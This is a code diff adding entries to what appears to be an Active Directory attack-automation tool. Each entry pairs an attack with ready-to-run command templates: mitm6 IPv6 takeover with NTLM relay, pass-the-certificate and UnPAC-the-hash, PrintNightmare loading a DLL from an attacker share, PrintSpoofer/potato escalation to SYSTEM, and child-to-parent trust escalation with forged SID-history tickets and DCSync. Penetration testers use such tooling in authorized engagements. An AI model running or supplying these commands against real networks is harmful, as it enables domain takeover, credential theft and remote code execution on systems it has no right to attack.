@@ -384,6 +384,17 @@ def build_catalog():
            lambda st: f"coercer coerce -t {st.dc_ip} -l <attacker-ip>   # or PetitPotam.py",
            tool=_first("coercer", "PetitPotam.py")))
 
+    A(Tech("mitm6", P_FOOTHOLD, "mitm6 - IPv6 DHCPv6/DNS takeover -> relay", MANUAL, 2,
+           "No creds > MITM > IPv6 (DHCPv6 preferred over IPv4)",
+           "Windows prefers IPv6: spoof DHCPv6 + WPAD to become the victims' DNS, then relay the "
+           "coerced auth to LDAPS to add a computer / grant RBCD.",
+           lambda st: True,
+           lambda st: (
+               f"mitm6 -d {st.domain or '<dom>'} -i tun0\n"
+               f"{impacket('ntlmrelayx') or 'impacket-ntlmrelayx'} -6 -t ldaps://{st.dc_ip} "
+               f"-wh fakewpad.{st.domain or '<dom>'} --delegate-access -smb2support"),
+           tool="mitm6"))
+
     # ===================================================================== #
     #  PHASE 1 - username(s) known
     # ===================================================================== #
@@ -514,6 +525,15 @@ def build_catalog():
            tool=impacket("findDelegation"),
            success=re.compile(r"Unconstrained|Constrained|RBCD", re.I)))
 
+    A(Tech("trust-enum", P_CREDS, "Enumerate domain / forest trusts", ENUM, 2,
+           "Creds > LDAP > trustedDomain objects",
+           "Trusts open escalation to other domains - map them early; a child->parent edge is a "
+           "reliable route to Enterprise Admin.",
+           lambda st: st.have_creds,
+           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} -M enum_trusts",
+           tool=nxc_bin(),
+           success=re.compile(r"trust|Parent|Child|Forest", re.I)))
+
     # Phase 2 exploitation - printed only
     A(Tech("crack", P_CREDS, "Crack roasted hashes offline", MANUAL, 1,
            "Creds > offline > hashcat",
@@ -554,6 +574,20 @@ def build_catalog():
            lambda st: st.have_creds,
            lambda st: ("certipy req -u <me>@<dom> -p <pw> -ca <CA> -template <vuln> -upn administrator@<dom> -dc-ip <dc>\n"
                        "certipy auth -pfx administrator.pfx -dc-ip <dc>     # -> TGT + NT hash"),
+           tool="certipy"))
+
+    A(Tech("pass-the-cert", P_CREDS, "Pass-the-Certificate (auth with a PFX)", MANUAL, 2,
+           "Creds > ADCS > PKINIT with an existing certificate",
+           "Already hold a certificate (from ESC, shadow creds, or loot)? Authenticate with it for a "
+           "TGT and the account's NT hash - works even when the password/hash is unknown.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"certipy auth -pfx <cert.pfx> -dc-ip {st.dc_ip}            # -> TGT + NT hash\n"
+               "# key-only (PKINITtools):\n"
+               "gettgtpkinit.py -cert-pfx <cert.pfx> -pfx-pass <pw> "
+               f"{st.domain or '<dom>'}/<user> out.ccache\n"
+               "getnthash.py -key <as-rep-key> "
+               f"{st.domain or '<dom>'}/<user>   # UnPAC-the-hash"),
            tool="certipy"))
 
     A(Tech("maq", P_CREDS, "Read MachineAccountQuota (gates RBCD / noPac)", ENUM, 2,
@@ -620,6 +654,21 @@ def build_catalog():
                f"noPac.py {st.impacket_target_noat()} -dc-ip {st.dc_ip} -dc-host <dc-hostname> "
                "--impersonate administrator -use-ldap -shell\n"
                "# or dump instead of shell:  ... -dump -just-dc-user <dom>/krbtgt"),
+           tool=None))
+
+    A(Tech("print-abuse", P_CREDS, "PrintNightmare / PrintSpoofer -> SYSTEM", MANUAL, 2,
+           "Creds > Spooler > CVE-2021-1675/34527 (remote) or SeImpersonate (local)",
+           "A vulnerable Print Spooler is a dependable SYSTEM path: PrintNightmare runs a DLL as a "
+           "domain user over RPC; PrintSpoofer/potatoes abuse SeImpersonate once you have a service "
+           "shell on the box.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"{nxc} smb {st.target} {st.nxc_auth()} -M printnightmare   # detection scan\n"
+               "# remote (domain user -> SYSTEM via malicious DLL on a share):\n"
+               f"printnightmare.py {st.impacket_target_noat()}@{st.target} "
+               "-dll '\\\\<attacker>\\share\\add_user.dll'\n"
+               "# local (you already have a SeImpersonate service shell):\n"
+               "PrintSpoofer64.exe -i -c cmd      # or GodPotato / JuicyPotatoNG"),
            tool=None))
 
     A(Tech("mssql-enum", P_CREDS, "MSSQL access, privileges & linked servers", ENUM, 1,
@@ -698,6 +747,22 @@ def build_catalog():
            lambda st: (f"{impacket('ticketer') or 'impacket-ticketer'} -nthash <krbtgt> "
                        f"-domain-sid <SID> -domain {st.domain or '<dom>'} administrator"),
            tool=impacket("ticketer")))
+
+    A(Tech("trust-escalate", P_DOMAIN, "Child -> parent domain escalation (SID history)", MANUAL, 2,
+           "Domain dominance > trusts > child-to-parent",
+           "DA on a child domain gets you Enterprise Admin: forge an inter-realm TGT with the "
+           "parent's Enterprise Admins SID (519) in SID history, then DCSync the parent.",
+           lambda st: st.domain_admin,
+           lambda st: (
+               f"# automated (needs the child krbtgt):\n"
+               f"{impacket('raiseChild') or 'impacket-raiseChild'} "
+               f"<child_dom>/<da_user>:<pw>@<child_dc>\n"
+               "# manual - forge the inter-realm TGT by hand:\n"
+               f"{impacket('ticketer') or 'impacket-ticketer'} -nthash <child_krbtgt> "
+               "-domain-sid <child_sid> -domain <child_dom> "
+               "-extra-sid <parent_sid>-519 -spn krbtgt/<parent_dom> hacker\n"
+               "# then DCSync the parent DC with the forged ticket"),
+           tool=impacket("raiseChild")))
 
     return cat
 
